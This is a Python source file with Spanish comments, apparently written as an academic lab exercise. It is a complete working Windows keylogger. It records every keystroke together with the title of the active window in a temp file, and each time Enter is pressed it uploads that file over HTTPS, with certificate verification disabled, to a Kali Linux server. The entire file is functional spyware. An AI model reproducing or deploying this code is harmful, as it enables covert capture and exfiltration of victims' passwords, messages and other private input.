import os
import threading  # Permite enviar el archivo en segundo plano sin congelar el teclado
import requests
import win32gui
from pynput import keyboard

# Deshabilitar las advertencias visuales de SSL (ya que usamos un certificado autofirmado en Kali)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 1. Configuración de rutas (Ruta universal TEMP de Windows)
carpeta_temporal = os.environ.get('TEMP')
carpeta_destino = os.path.join(carpeta_temporal, 'output.txt')
print(f"[+] El archivo local de diagnóstico se guardará en: {carpeta_destino}")

# 2. Configuración de Red (IP de tu servidor Kali Linux)

IP_KALI = "192.168.87.128" 
URL_SERVIDOR = f"https://{IP_KALI}:443/api/upload"

# Variables globales para el control del texto y ventanas
ultima_ventana = ""
bufer_palabra = ""

def obtener_ventana_activa():
    """Obtiene el título de la ventana en primer plano."""
    try:
        ventana = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(ventana)
    except Exception:
        return "Ventana Desconocida"

def escribir_en_archivo(texto):
    """Escribe texto en el archivo sin añadir saltos de línea automáticos."""
    with open(carpeta_destino, "a", encoding="utf-8") as archivo:
        archivo.write(texto)

def guardar_bufer():
    """Escribe el contenido acumulado en el archivo y limpia el búfer."""
    global bufer_palabra
    if bufer_palabra:  # Solo escribe si hay algo guardado
        escribir_en_archivo(bufer_palabra)
        bufer_palabra = ""  # Vacía el búfer para la siguiente palabra

def transmitir_archivo_async():
    """Función interna que realiza el envío por HTTPS en segundo plano."""
    try:
        if not os.path.exists(carpeta_destino):
            return

        with open(carpeta_destino, 'rb') as archivo:
            # Enviamos el archivo estructurado para la API de Flask en Kali
            archivos_a_enviar = {'file': ('output.txt', archivo)}
            
            # verify=False es obligatorio por el certificado SSL de prueba (autofirmado)
            respuesta = requests.post(URL_SERVIDOR, files=archivos_a_enviar, verify=False, timeout=5)
            
            if respuesta.status_code == 200:
                print("\n[+] [Red] Copia del reporte enviada con éxito a la Kali por HTTPS.")
            else:
                print(f"\n[-] [Red] El servidor Kali respondió con código de error: {respuesta.status_code}")
                
    except requests.exceptions.RequestException:
        # Falla silenciosa o controlada en consola para no interrumpir al usuario si la Kali está desconectada
        print("\n[-] [Red] No se pudo conectar con el servidor HTTPS en Kali (¿Está apagado el servidor Flask?)")

def disparar_envio_red():
    """Crea y arranca un hilo independiente para procesar el envío sin retrasar el teclado."""
    hilo_red = threading.Thread(target=transmitir_archivo_async)
    hilo_red.daemon = True  # Permite que el hilo muera si el programa principal se cierra
    hilo_red.start()

def on_press(key):
    global ultima_ventana, bufer_palabra
    ventana_actual = obtener_ventana_activa()
    
    # Si el usuario cambió de aplicación, guardamos lo que teníamos y anotamos la nueva app
    if ventana_actual != ultima_ventana:
        guardar_bufer()
        ultima_ventana = ventana_actual
        mensaje_ventana = f"\n\n[Aplicacion: {ventana_actual}]\n"
        print(mensaje_ventana.strip())
        escribir_en_archivo(mensaje_ventana)

    try:
        # Si es un carácter alfanumérico normal, lo acumulamos en el búfer
        bufer_palabra += str(key.char)
        print(f"Letra acumulada: {key.char}")
        
    except AttributeError:
        # Manejo de teclas especiales
        if key == keyboard.Key.space:
            bufer_palabra += " "  # Añade el espacio a la palabra actual
            guardar_bufer()       # Guarda la palabra (se mantiene en la misma línea)
            print("[Espacio - Palabra guardada en línea continua]")
            
        elif key == keyboard.Key.enter:
            guardar_bufer()       # Guarda lo que quede en el búfer
            escribir_en_archivo("\n")  # Aquí sí forzamos el salto de línea
            print("[Enter - Nueva línea]")
            
            # Evento académico: Al presionar Enter, se dispara la sincronización con Kali en segundo plano
            disparar_envio_red()
            
        elif key == keyboard.Key.backspace:
            # Si el usuario borra, quitamos el último carácter del búfer
            if len(bufer_palabra) > 0:
                bufer_palabra = bufer_palabra[:-1]
                print("[Retroceso - Letra borrada del búfer]")
        else:
            # Otras teclas especiales se guardan inline para no romper el flujo de la frase
            guardar_bufer()
            escribir_en_archivo(f" [{key.name}] ")
            print(f"Tecla especial: {key.name}")

# Iniciar el escuchador del teclado de pynput
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
